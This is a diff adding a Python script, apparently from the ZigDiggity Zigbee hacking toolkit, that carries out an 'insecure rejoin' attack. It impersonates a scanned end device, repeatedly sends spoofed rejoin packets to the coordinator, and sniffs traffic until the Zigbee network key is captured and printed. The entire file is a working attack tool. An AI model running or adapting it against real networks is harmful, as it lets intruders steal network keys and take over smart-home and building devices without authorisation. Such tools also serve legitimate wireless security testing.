@@ -1,0 +1,166 @@
+#!/usr/bin/python
+
+from zigdiggity.interface.main import start_and_get_targets
+from zigdiggity.datastore import database_session
+from zigdiggity.datastore.networks import Network
+from zigdiggity.datastore.devices import Device
+import zigdiggity.utils.packets as packets
+from zigdiggity.interface.colors import *
+
+from threading import Event
+import threading
+import signal
+import time
+from scapy.layers.dot15d4 import *
+from scapy.layers.zigbee import *
+
+def listen_for_packets(listener, database_session, channel, target_pan, target_epan):
+
+    global network_key
+    Color.pl("{+} Listener thread started")
+    while not stop_threads.isSet():
+        packet = listener.recv()
+        if packet is not None:
+            packets.add_to_datasource(packet, database_session, channel)
+        
+        # check if we have a record in our database now
+        if target_epan is None:
+            networks = database_session.query(Network).filter_by(pan_id=target_pan).all()
+        else:
+            networks = database_session.query(Network).filter_by(extended_pan_id=target_epan).all()
+        
+        if networks is not None:
+            for network in networks:
+                if network.nwk_key is not None:
+                    Color.pl("{+} Network key for network found")
+                    network_key = network.nwk_key
+                    Color.pl("{+} The network key is: %s" % network_key)
+                    stop_threads.set()
+
+def send_insecure_rejoins(sender, source, extended_source,destination, pan):
+
+    Color.pl("{+} Sender thread (insecure rejoin) started")
+    last_rejoin_sent = 0
+    while not stop_threads.isSet():
+        if last_rejoin_sent + 5 < time.time():
+            packet = packets.insecure_rejoin(source, destination, pan, long(extended_source))
+            sender.send(packet)
+            last_rejoin_sent = time.time()
+        
+
+def handle_interrupt(signal, frame):
+    stop_threads.set()
+    Color.pl("")
+    Color.pl("{.} Receiver average time: %s ms" % (listener.avg_recv() * 1000))
+    Color.pl("{.} Sender average time: %s ms" % (sender.avg_send() * 1000))
+    time.sleep(1)
+    exit(1)
+
+if __name__ == '__main__':
+    init_info = start_and_get_targets(database_session)
+
+    sender = init_info['sender']
+    listener = init_info['listener']
+    target_type = init_info['target']['target_type']
+
+    if target_type == 'channel':        
+        Color.pl("{!} Insecure rejoin attacks must target a network.")
+        Color.pl("{!} Please re-run and choose {G}Network {W}.")
+        exit(1)
+    elif target_type == 'network':
+        network_target = init_info['target']['network']
+        channel = network_target.channel
+        target_epan = network_target.extended_pan_id
+        if target_epan is None:
+            
+            # need to find the epan to perform the network attack
+            target_pan = network_target.pan_id
+            if target_pan is None:
+                Color.pl("{!} Cannot target a network without a PAN or extended PAN.")
+                exit(1)
+            
+            network = database_session.query(Network).filter_by(pan_id=target_pan).first()
+            if network is not None:
+                target_epan = network.extended_pan_id
+                network_key = network.nwk_key.decode('hex')
+            else:
+                pass
+
+        else:
+            target_pan = network_target.pan_id
+
+    elif target_type == 'device':
+        Color.pl("{!} Open Sesame must target a network.")
+        Color.pl("{!} Please re-run and choose {G}Network {W}.")
+        exit(1)
+
+    network_key = None
+
+    listener.set_channel(channel)
+    sender.set_channel(channel)
+    '''
+    if target_epan is None:
+        Color.pl("{!} Need a network with a valid extended PAN for this attack.")
+        Color.pl("{!} Please scan the network again to find the extended PAN.")
+        exit(1)
+    '''
+    target_esrc = None
+    target_src = None
+    target_dest = None
+    
+    if target_epan is not None:
+        for device in database_session.query(Device).filter_by(extended_pan_id=target_epan):
+            if not device.is_coordinator and device.extended_address is not None and device.address is not None:
+                target_esrc = device.extended_address
+                target_src = device.address
+            elif device.is_coordinator:
+                target_dest = device.address
+    else:
+        for device in database_session.query(Device).filter_by(pan_id=target_pan):
+            if not device.is_coordinator and device.extended_address is not None and device.address is not None:
+                target_esrc = device.extended_address
+                target_src = device.address
+            elif device.is_coordinator:
+                target_dest = device.address
+
+    if target_esrc is None or target_src is None:
+        Color.pl("{!} Could not located a target device to attempt to perform the rejoin")
+        Color.pl("{!} Please scan the network again until such a device is found.")
+        exit(1)
+    if target_dest is None:
+        Color.pl("{!} Could not find the coordinator's address. Assuming 0x0000")
+        target_dest = 0x0000
+
+    if target_epan is None:
+        networks = database_session.query(Network).filter_by(pan_id=target_pan).all()
+    else:
+        networks = database_session.query(Network).filter_by(extended_pan_id=target_epan).all()
+        
+    if networks is not None:
+        for network in networks:
+            if network.nwk_key is not None:
+                Color.pl("{+} Network key already found in database.")
+                network_key = network.nwk_key
+                Color.pl("{+} The previous network key was: %s" % network_key)
+                Color.pl("{.} If you would like to perform the attack, please clear the cached data.")
+                exit(1)
+
+    global stop_threads 
+    stop_threads = Event()
+
+    listen_thread = threading.Thread(target=listen_for_packets, args=(listener, database_session, channel, target_pan, target_epan))
+    send_thread = threading.Thread(target=send_insecure_rejoins, args=(sender, target_src, target_esrc, target_dest, target_pan))
+
+    listen_thread.daemon = True
+    send_thread.daemon = True
+
+    send_thread.start()
+    listen_thread.start()
+
+    signal.signal(signal.SIGINT, handle_interrupt)
+
+    while not stop_threads.isSet():
+        try:
+            send_thread.join(timeout=1)
+        except KeyboardInterrupt:
+            stop_threads.set()
